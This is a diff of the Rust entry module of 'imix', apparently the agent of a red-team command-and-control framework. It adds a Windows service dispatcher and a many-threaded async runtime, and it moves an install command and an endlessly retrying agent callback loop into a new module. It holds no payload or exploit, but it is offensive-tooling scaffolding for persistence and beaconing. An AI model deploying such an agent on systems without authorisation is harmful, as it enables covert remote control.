@@ -1,57 +1,26 @@
+#![allow(dead_code)]
 mod agent;
 mod config;
 mod install;
+mod run;
 mod task;
 mod version;
 #[cfg(feature = "win_service")]
 pub mod win_service;
 
-use std::time::Duration;
+#[tokio::main(flavor = "multi_thread", worker_threads = 128)]
+async fn lib_entry() {
+    #[cfg(debug_assertions)]
+    run::init_logging();
 
-pub use agent::Agent;
-use clap::Command;
-pub use config::Config;
-pub use install::install;
-
-
-pub async fn handle_main(){
-    if let Some(("install", _)) = Command::new("imix")
-        .subcommand(Command::new("install").about("Install imix"))
-        .get_matches()
-        .subcommand()
-    {
-        install().await;
-        return;
-    }
-
-    loop {
-        let cfg = Config::default();
-        let retry_interval = cfg.retry_interval;
-        #[cfg(debug_assertions)]
-        log::info!("agent config initialized {:#?}", cfg.clone());
-
-        match run(cfg).await {
-            Ok(_) => {}
-            Err(_err) => {
-                #[cfg(debug_assertions)]
-                log::error!("callback loop fatal: {_err}");
-
-                tokio::time::sleep(Duration::from_secs(retry_interval)).await;
-            }
+    #[cfg(feature = "win_service")]
+    match windows_service::service_dispatcher::start("imix", ffi_service_main) {
+        Ok(_) => {}
+        Err(_err) => {
+            #[cfg(debug_assertions)]
+            log::error!("Failed to start service (running as exe?): {_err}");
         }
     }
-}
 
-async fn run(cfg: Config) -> anyhow::Result<()> {
-    let mut agent = Agent::new(cfg)?;
-    agent.callback_loop().await?;
-    Ok(())
-}
-
-#[cfg(debug_assertions)]
-pub fn init_logging() {
-    pretty_env_logger::formatted_timed_builder()
-        .filter_level(log::LevelFilter::Info)
-        .parse_env("IMIX_LOG")
-        .init();
+    run::handle_main().await
 }
